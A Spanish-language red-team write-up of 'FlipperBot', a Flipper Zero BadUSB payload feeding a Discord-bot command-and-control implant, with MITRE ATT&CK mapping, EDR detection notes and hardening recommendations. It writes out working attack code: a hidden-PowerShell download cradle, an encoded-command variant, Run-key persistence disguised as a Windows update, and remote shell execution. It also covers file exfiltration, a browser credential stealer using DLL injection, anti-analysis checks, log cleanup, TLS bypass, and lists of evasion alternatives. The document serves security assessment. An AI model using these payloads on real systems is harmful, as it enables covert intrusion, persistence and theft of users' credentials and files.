# FlipperBot - Analisis Tecnico Red Team

## Resumen Ejecutivo

FlipperBot es una herramienta de demostracion ofensiva que combina un dispositivo Flipper Zero (BadUSB) con un bot de Discord como canal de Command & Control. Permite evaluar la postura de seguridad de endpoints corporativos contra ataques de acceso fisico, persistencia, evasion de EDR y exfiltracion de datos.

Cubre **6 de 7 fases del Cyber Kill Chain** y **11 de 14 tacticas MITRE ATT&CK**.

---

## Cadena de Ataque Completa

```
[Flipper Zero BadUSB] --> [PowerShell Download Cradle] --> [Python Portable Install]
        |                          |                              |
   Acceso Fisico            Descarga remota              Instalacion silenciosa
   (T1200)                  (T1059.001/T1105)            (T1105/T1059.006)
                                                              |
                                                    [Registry Run Key]
                                                    Persistencia (T1547.001)
                                                              |
                                                     [Discord Bot C2]
                                                     Canal C2 (T1102.002)
                                                              |
                            +------------------+--------------+---------------+
                            |                  |              |               |
                       !cmd / !ps         !screenshot      !creds        !download
                       Ejecucion          Captura         Credenciales   Exfiltracion
                       (T1059)            (T1113)         (T1555.003)    (T1041)
```

---

## Analisis por Comando

---

### 1. Payload BadUSB (DuckyScript)

**Que hace:** El Flipper Zero se conecta via USB y el sistema lo reconoce como un teclado HID. Escribe automaticamente comandos de PowerShell en la PC victima en segundos.

**Que ejecuta:**
```
GUI                          # Abre el menu de inicio
STRING powershell            # Escribe "powershell"
ENTER                        # Abre PowerShell
STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-C [TLS fix]; irm [URL] | iex'; exit
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Hardware Additions | T1200 | Initial Access |
| PowerShell | T1059.001 | Execution |
| Hidden Window | T1564.003 | Defense Evasion |

**Alternativas de uso:**
- Desplegar ransomware simulado para ejercicios de respuesta a incidentes
- Instalar agentes de monitoreo en equipos no gestionados
- Ejecutar scripts de auditoria de cumplimiento en estaciones sin acceso remoto
- Simular ataques de insider threat con acceso fisico

**Que deberia detectar el EDR:**
- Ejecucion de PowerShell desde un dispositivo HID no autorizado
- Dispositivos USB nuevos conectados (alerta de endpoint)

---

### 2. Download Cradle (irm | iex)

**Que hace:** Descarga un script de PowerShell desde GitHub y lo ejecuta directamente en memoria, sin escribir nada en disco.

**Que ejecuta:**
```powershell
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
irm https://raw.githubusercontent.com/.../f44b1874d8cce12b_run.ps1 | iex
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |
| Ingress Tool Transfer | T1105 | Command and Control |

**Alternativas de uso:**
- Cambiar `irm` por `Invoke-WebRequest` + `Invoke-Expression` si `irm` esta bloqueado
- Usar `certutil -urlcache` o `bitsadmin` como download cradles alternativos
- Codificar el cradle con `-EncodedCommand` para evadir firmas AMSI
- Usar `mshta`, `regsvr32`, o `rundll32` como LOLBins alternativos

**Que deberia detectar el EDR:**
- Patron `irm ... | iex` es uno de los indicadores mas monitoreados
- Conexiones salientes a `raw.githubusercontent.com` desde PowerShell
- Script Block Logging deberia capturar el contenido descargado

---

### 3. Comando Codificado en Base64 (-EncodedCommand)

**Que hace:** El payload de Win+R usa `-EncodedCommand` para pasar el comando de PowerShell como base64 UTF-16LE, evitando problemas con caracteres especiales y dificultando la inspeccion visual.

**Que ejecuta:**
```
powershell -NoP -W H -EncodedCommand WwBOAGUAdAAuAF...
```
Que decodifica a:
```powershell
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/.../f44b1874d8cce12b_run.ps1 | iex
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Command Obfuscation | T1027.010 | Defense Evasion |
| Hidden Window | T1564.003 | Defense Evasion |

**Alternativas de uso:**
- Concatenacion de strings: `$a="ir"; $b="m"; & ($a+$b) URL | iex`
- Compresion + base64: `[IO.StreamReader]::new([IO.Compression.GZipStream]::new(...))`
- Variable environment slicing para construir comandos letra por letra
- XOR encoding con clave personalizada

**Que deberia detectar el EDR:**
- `-EncodedCommand` es un indicador de alta fidelidad
- AMSI deberia decodificar y analizar el contenido antes de ejecutarlo

---

### 4. Ofuscacion del Token (Base64)

**Que hace:** El token del bot de Discord se almacena codificado en base64 dentro del script, evitando que GitHub Secret Scanning lo detecte y lo revoque automaticamente.

**Que ejecuta:**
```powershell
$bt=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TVRVeU16QTJ...'))
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Obfuscated Files or Information | T1027 | Defense Evasion |

**Alternativas de uso:**
- Dividir el token en fragmentos y concatenar: `$t1+$t2+$t3`
- Cifrar con AES y usar una clave derivada del hostname
- Almacenar en un registro de Windows o variable de entorno
- Usar esteganografia para ocultar el token en una imagen

**Que deberia detectar el EDR:**
- Decodificacion de base64 seguida de uso como credencial de API

---

### 5. Instalacion de Python Portable

**Que hace:** Descarga Python embebido (sin instalador), configura pip, e instala las dependencias del bot, todo en `%APPDATA%\FlipperBot\` sin privilegios de administrador.

**Que ejecuta:**
```powershell
# Descarga Python embebido
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile $pyZip
Expand-Archive -Path $pyZip -DestinationPath $pyDir -Force

# Habilita pip
(Get-Content python311._pth) -replace '#import site', 'import site' | Set-Content ...

# Instala dependencias
& python.exe -m pip install discord.py Pillow psutil certifi --quiet
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Ingress Tool Transfer | T1105 | Command and Control |
| Python | T1059.006 | Execution |

**Alternativas de uso:**
- Usar Node.js portable en vez de Python
- Compilar el bot como `.exe` con PyInstaller para eliminar la dependencia de Python
- Usar PowerShell puro sin Python (menos funcionalidad pero cero dependencias)
- Descargar un binario Go compilado estaticamente

**Que deberia detectar el EDR:**
- Descarga y ejecucion de Python desde un directorio temporal/appdata
- Instalacion de paquetes pip en ubicaciones no estandar

---

### 6. Persistencia via Registry Run Key

**Que hace:** Agrega una entrada en el registro de Windows que relanza el bot automaticamente cada vez que el usuario inicia sesion. El nombre de la clave es `WindowsSecurityUpdate` para parecer legitimo.

**Que ejecuta:**
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'WindowsSecurityUpdate' `
    -Value 'powershell -WindowStyle Hidden -Command "& python.exe bot.py"'
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Registry Run Keys / Startup Folder | T1547.001 | Persistence |

**Alternativas de uso:**
- Scheduled Task: `schtasks /create /tn "Update" /tr "..." /sc onlogon`
- WMI Event Subscription (mas sigiloso, T1546.003)
- Startup Folder: copiar un `.lnk` a `shell:startup`
- Servicio de Windows (requiere admin, T1543.003)
- DLL search order hijacking en aplicaciones legitimas (T1574.001)

**Que deberia detectar el EDR:**
- Creacion/modificacion de claves en `...\CurrentVersion\Run` es uno de los indicadores mas basicos
- El valor apunta a PowerShell oculto ejecutando Python desde AppData — altamente sospechoso

---

### 7. Discord Bot como Canal C2

**Que hace:** Usa la API de Discord como canal de comunicacion bidireccional entre el atacante y el implante. El trafico se mezcla con trafico legitimo de Discord y usa HTTPS/WSS.

**Como funciona:**
```
Atacante (Discord) <--HTTPS/WSS--> discord.com <--HTTPS/WSS--> Bot en PC victima
     |                                                              |
  Envia !cmd whoami                                          Ejecuta y responde
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Web Service: Bidirectional Communication | T1102.002 | Command and Control |
| Application Layer Protocol: Web | T1071.001 | Command and Control |

**Alternativas de uso:**
- Telegram Bot API como C2 alternativo
- Slack Webhooks para exfiltracion unidireccional
- DNS tunneling para entornos donde HTTPS esta inspeccionado
- HTTPS beacon a un servidor propio (Cobalt Strike style)
- GitHub Issues/Gists como dead drop C2

**Que deberia detectar el EDR:**
- Conexiones WebSocket persistentes a `gateway.discord.gg` desde un proceso Python no interactivo
- Trafico a la API de Discord desde procesos que no son el cliente oficial

---

### 8. !ping

**Que hace:** Verifica que el bot esta activo y muestra la latencia al servidor de Discord.

**Que ejecuta:**
```python
latency = round(bot.latency * 1000)  # Latencia del WebSocket
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| (Operacional - no mapea directamente) | — | — |

**Alternativas de uso:**
- Heartbeat check para monitorear multiples implantes
- Medir calidad de la conexion C2 antes de operaciones grandes

---

### 9. !info

**Que hace:** Recolecta informacion del sistema: hostname, usuario, OS, CPU, RAM, uso de CPU, y tiempo encendida.

**Que ejecuta:**
```python
platform.node()              # Hostname
os.getlogin()                # Usuario actual
platform.platform()          # OS completo
platform.processor()         # CPU
psutil.virtual_memory()      # RAM total y usada
psutil.cpu_percent()         # Uso de CPU
psutil.boot_time()           # Uptime
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| System Information Discovery | T1082 | Discovery |
| System Owner/User Discovery | T1033 | Discovery |

**Alternativas de uso:**
- Agregar enumeracion de red: `Get-NetIPAddress`, `Get-NetTCPConnection`
- Listar software instalado para identificar vectores adicionales
- Detectar si es una VM/sandbox (T1497)
- Enumerar grupos y privilegios del usuario (T1069)

**Que deberia detectar el EDR:**
- Consultas masivas de informacion del sistema desde un proceso Python no interactivo

---

### 10. !screenshot

**Que hace:** Captura una imagen de toda la pantalla y la envia como archivo PNG al canal de Discord.

**Que ejecuta:**
```python
from PIL import ImageGrab
img = ImageGrab.grab()       # Captura toda la pantalla
buf = io.BytesIO()
img.save(buf, format="PNG")  # Convierte a PNG en memoria
# Envia como archivo adjunto a Discord
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Screen Capture | T1113 | Collection |

**Alternativas de uso:**
- Captura de ventana especifica en vez de pantalla completa
- Grabacion de video continua con intervalo configurable
- Captura de clipboard (T1115)
- Keylogger para capturar texto escrito (T1056.001)

**Que deberia detectar el EDR:**
- Llamadas a API de captura de pantalla desde procesos no autorizados
- Envio de imagenes PNG a servidores externos inmediatamente despues de captura

---

### 11. !say [texto]

**Que hace:** Usa el sintetizador de voz de Windows (SAPI) para que la PC hable el texto enviado en voz alta.

**Que ejecuta:**
```powershell
Add-Type -AssemblyName System.Speech
$s = New-Object System.Speech.Synthesis.SpeechSynthesizer
$s.Speak("texto del atacante")
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |
| Internal Defacement | T1491.001 | Impact |

**Alternativas de uso:**
- Demostracion de impacto en presentaciones de concientizacion
- Distraccion del usuario mientras se ejecutan otros comandos
- Social engineering: hacer que la PC "hable" mensajes que parezcan del sistema

---

### 12. !notify [titulo] | [mensaje]

**Que hace:** Muestra una notificacion toast de Windows con titulo y mensaje personalizado.

**Que ejecuta:**
```powershell
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(5000, 'titulo', 'mensaje', [System.Windows.Forms.ToolTipIcon]::Info)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Internal Defacement | T1491.001 | Impact |

**Alternativas de uso:**
- Phishing interno: "Su sesion ha expirado, haga clic para renovar"
- Distraccion del usuario durante exfiltracion
- Simular alertas del sistema para inducir acciones del usuario

---

### 13. !cmd [comando]

**Que hace:** Ejecuta cualquier comando del sistema operativo a traves de `cmd.exe` y devuelve el output completo al canal de Discord.

**Que ejecuta:**
```python
subprocess.run(
    "cmd /C " + comando,     # Ejecuta via cmd.exe
    capture_output=True,      # Captura stdout y stderr
    text=True,
    timeout=60,               # Timeout de 60 segundos
    shell=True,
)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Windows Command Shell | T1059.003 | Execution |

**Ejemplos de uso ofensivo:**
```
!cmd whoami /all                    # Privilegios del usuario
!cmd net user                       # Usuarios locales
!cmd net localgroup administrators  # Admins locales
!cmd netstat -ano                   # Conexiones de red
!cmd tasklist /v                    # Procesos detallados
!cmd reg query HKLM\SOFTWARE       # Enumerar registro
!cmd type C:\confidencial.txt      # Leer archivos
!cmd dir /s /b *.pdf               # Buscar archivos PDF
```

**Que deberia detectar el EDR:**
- Ejecucion de `cmd.exe` como hijo de un proceso Python en AppData
- Comandos de reconocimiento (`whoami`, `net user`, `netstat`) en secuencia rapida

---

### 14. !ps [comando]

**Que hace:** Ejecuta comandos de PowerShell con toda su funcionalidad (cmdlets, pipeline, .NET).

**Que ejecuta:**
```python
subprocess.run(
    "powershell -NoProfile -Command " + comando,
    capture_output=True,
    text=True,
    timeout=60,
    shell=True,
)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |

**Ejemplos de uso ofensivo:**
```
!ps Get-Process                                    # Procesos
!ps Get-NetTCPConnection                           # Conexiones TCP
!ps Get-LocalUser                                  # Usuarios locales
!ps Get-ChildItem Env:                             # Variables de entorno
!ps Get-WmiObject Win32_Product                    # Software instalado
!ps Get-ItemProperty HKLM:\SOFTWARE\...            # Leer registro
!ps Get-Content C:\Windows\System32\drivers\etc\hosts  # Archivo hosts
!ps Invoke-WebRequest -Uri http://attacker/tool -OutFile C:\temp\tool.exe  # Descargar herramienta
```

**Que deberia detectar el EDR:**
- PowerShell ejecutado como hijo de Python con `-NoProfile`
- Script Block Logging deberia capturar cada comando

---

### 15. !download [ruta]

**Que hace:** Lee un archivo de la PC victima y lo envia como adjunto al canal de Discord (exfiltracion).

**Que ejecuta:**
```python
# Expande variables de entorno y lee el archivo
path = os.path.expandvars(os.path.expanduser(ruta))
# Envia como adjunto de Discord (limite 25 MB)
await ctx.send(file=discord.File(path))
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Exfiltration Over C2 Channel | T1041 | Exfiltration |

**Ejemplos de uso ofensivo:**
```
!download %USERPROFILE%\Desktop\passwords.xlsx
!download C:\Users\admin\Documents\financiero.pdf
!download %APPDATA%\Microsoft\Credentials\*
!download C:\Windows\System32\config\SAM          # Requiere SYSTEM
```

**Que deberia detectar el EDR:**
- Lectura de archivos sensibles seguida de trafico saliente a Discord
- Acceso a archivos en rutas de credenciales

---

### 16. !upload [ruta destino]

**Que hace:** Recibe un archivo adjunto en Discord y lo guarda en la ruta especificada de la PC victima (ingress de herramientas).

**Que ejecuta:**
```python
# Descarga el adjunto de Discord via aiohttp (bypass SSL)
async with aiohttp.ClientSession() as session:
    async with session.get(attachment.url, ssl=ssl_ctx) as resp:
        data = await resp.read()
# Escribe en la ruta destino
with open(dest, 'wb') as f:
    f.write(data)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Ingress Tool Transfer | T1105 | Command and Control |

**Ejemplos de uso ofensivo:**
```
!upload C:\temp\mimikatz.exe           # Subir herramienta
!upload C:\Users\Public\backdoor.ps1   # Subir script
!upload %APPDATA%\config.dat           # Subir configuracion
```

**Nota:** Actualmente bloqueado por el proxy SSL corporativo (403 en cdn.discordapp.com). Esto es un hallazgo positivo — el proxy SSL esta cumpliendo su funcion de inspeccion.

**Que deberia detectar el EDR:**
- Descarga de archivos desde CDN de Discord hacia rutas del sistema
- Archivos ejecutables escritos en disco desde procesos Python

---

### 17. !creds

**Que hace:** Extrae credenciales guardadas en Chrome y Edge, incluyendo las protegidas por App-Bound Encryption (Chrome 127+), usando un binario Rust que inyecta una DLL en el proceso del navegador.

**Que ejecuta:**
```
1. Lee "Local State" → extrae master key cifrada con DPAPI
2. Llama CryptUnprotectData() → obtiene master key v10/v11
3. Para v20 (ABE): lanza chrome.exe suspendido → inyecta DLL via
   CreateRemoteThread + LoadLibraryA → la DLL descifra dentro
   del contexto del navegador → devuelve la key via named pipe
4. Copia Login Data (SQLite) → consulta tabla "logins"
5. Descifra cada password con AES-256-GCM + la key correspondiente
6. Envia resultado como archivo .txt a Discord
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Credentials from Web Browsers | T1555.003 | Credential Access |
| DLL Injection | T1055.001 | Defense Evasion / Privilege Escalation |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |

**Alternativas de uso:**
- Extraer cookies de sesion en vez de passwords (session hijacking)
- Extraer tokens de Discord/Slack del navegador
- Extraer datos de autofill (tarjetas de credito, direcciones)
- Dumping de credenciales con Mimikatz (requiere admin)

**Que deberia detectar el EDR:**
- `CreateRemoteThread` en proceso de Chrome/Edge — indicador critico
- `VirtualAllocEx` + `WriteProcessMemory` (patron clasico de inyeccion)
- Lectura de archivos `Login Data` y `Local State` por un proceso externo
- Llamadas a `CryptUnprotectData` desde un proceso no-navegador

---

### 18. Watchdog de Procesos

**Que hace:** Cada 30 segundos escanea los procesos en ejecucion buscando herramientas de analisis. Si detecta alguna, alerta al atacante y ejecuta autodestruccion.

**Que monitorea:**
```python
WATCHDOG_PROCESSES = [
    "taskmgr", "procmon", "procmon64", "procexp", "procexp64",
    "ProcessHacker", "Wireshark", "tcpview", "tcpview64",
    "autoruns", "autoruns64", "perfmon",
]
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Security Software Discovery | T1518.001 | Discovery |
| Process Discovery | T1057 | Discovery |

**Alternativas de uso:**
- Agregar deteccion de debuggers (x64dbg, OllyDbg, IDA)
- Detectar VMs/sandboxes (vmtoolsd, VBoxService)
- En vez de autodestruirse, reducir actividad y esperar
- Detectar herramientas EDR especificas (CsFalconService, SophosSAU)

---

### 19. !selfdestruct / Cleanup

**Que hace:** Elimina toda evidencia del bot en la PC victima y cierra el proceso.

**Que limpia:**
```
1. Clave de persistencia del registro (WindowsSecurityUpdate)
2. Historial de PowerShell (lineas con el token o "FlipperBot")
3. Entradas de Run (Win+R) del registro que referencien al bot
4. Cache de pip (revela que se instalo discord.py)
5. Archivos recientes que referencien al bot
6. Cache DNS (oculta conexiones a discord.com)
7. Carpeta completa %APPDATA%\FlipperBot\
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Indicator Removal | T1070 | Defense Evasion |
| Clear Command History | T1070.003 | Defense Evasion |
| File Deletion | T1070.004 | Defense Evasion |

**Alternativas de uso:**
- Limpiar Windows Event Logs (requiere admin, T1070.001)
- Timestomping de archivos residuales (T1070.006)
- Sobrescribir archivos antes de borrar (wipe seguro)
- Limpiar Prefetch files y Amcache

**Que deberia detectar el EDR:**
- Eliminacion masiva de artefactos forenses en secuencia rapida
- Modificacion del historial de PowerShell
- Flush de DNS cache desde un proceso no interactivo

---

### 20. Bypass SSL (Proxy Corporativo)

**Que hace:** Parchea `ssl.create_default_context` de Python para desactivar la verificacion de certificados, permitiendo que el bot se comunique con Discord incluso cuando CrowdStrike/Sophos esta haciendo inspeccion SSL (MITM).

**Que ejecuta:**
```python
_orig_ctx = ssl.create_default_context
def _no_verify_ctx(*a, **kw):
    ctx = _orig_ctx(*a, **kw)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx
ssl.create_default_context = _no_verify_ctx
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Subvert Trust Controls | T1553 | Defense Evasion |

**Alternativas de uso:**
- Extraer el certificado CA corporativo y agregarlo al trust store
- Usar DNS over HTTPS para C2 (evita inspeccion SSL completamente)
- Tunneling via ICMP o DNS que no pasa por el proxy

---

## Cobertura Cyber Kill Chain

| Fase | Estado | Tecnicas Usadas |
|---|---|---|
| 1. Reconnaissance | No cubierta | (Pre-engagement, seleccion manual del target) |
| 2. Weaponization | Cubierta | Payloads DuckyScript, ofuscacion base64, compilacion del extractor |
| 3. Delivery | Cubierta | BadUSB via Flipper Zero, download cradle desde GitHub |
| 4. Exploitation | Cubierta | Inyeccion de keystrokes, ejecucion de PowerShell |
| 5. Installation | Cubierta | Python portable, persistencia en registro, bypass SSL |
| 6. Command & Control | Cubierta | Discord bot, comunicacion bidireccional |
| 7. Actions on Objectives | Cubierta | Credenciales, screenshots, ejecucion remota, exfiltracion |

---

## Cobertura MITRE ATT&CK por Tactica

| Tactica | Tecnicas | IDs |
|---|---|---|
| Initial Access | 1 | T1200 |
| Execution | 4 | T1059.001, T1059.003, T1059.006 |
| Persistence | 1 | T1547.001 |
| Privilege Escalation | 1 | T1055.001 |
| Defense Evasion | 6 | T1027, T1027.010, T1055.001, T1070, T1553, T1564.003 |
| Credential Access | 1 | T1555.003 |
| Discovery | 4 | T1033, T1057, T1082, T1518.001 |
| Collection | 1 | T1113 |
| Command and Control | 3 | T1071.001, T1102.002, T1105 |
| Exfiltration | 1 | T1041 |
| Impact | 1 | T1491.001 |

**Total: 11 de 14 tacticas cubiertas** (no cubre Reconnaissance, Resource Development, ni Lateral Movement).

---

## Hallazgos de Seguridad Durante las Pruebas

### Lo que NO detecto el EDR (CrowdStrike + Sophos)

1. **Ejecucion de PowerShell via BadUSB** — No detecto el dispositivo HID ni el download cradle
2. **Instalacion de Python portable** — Descarga desde python.org no fue bloqueada
3. **Persistencia en registro** — La clave Run no fue detectada ni alertada
4. **Canal C2 via Discord** — Trafico WebSocket no fue marcado como anomalo
5. **Extraccion de credenciales** — DLL injection + lectura de Login Data no fue bloqueada
6. **Ejecucion remota de comandos** — `cmd.exe` y PowerShell como hijos de Python no generaron alertas

### Lo que SI detecto/bloqueo

1. **Proxy SSL** — CrowdStrike/Sophos intercepta trafico HTTPS (inspeccion SSL activa)
2. **CDN de Discord bloqueado parcialmente** — Descargas desde `cdn.discordapp.com` devuelven 403 (bloquea `!upload`)

---

## Recomendaciones

1. **Configurar politicas de prevencion** (no solo deteccion) para `irm | iex` y `-EncodedCommand`
2. **Monitorear claves de registro Run** para entradas que ejecuten PowerShell oculto
3. **Alertar sobre DLL injection** — `CreateRemoteThread` en procesos de navegador
4. **Restringir dispositivos USB HID** mediante politicas de grupo o control de dispositivos
5. **Implementar allowlisting de aplicaciones** — Python desde AppData no deberia ejecutarse
6. **Monitorear conexiones WebSocket** a Discord desde procesos no autorizados
7. **Habilitar PowerShell Script Block Logging** y Module Logging
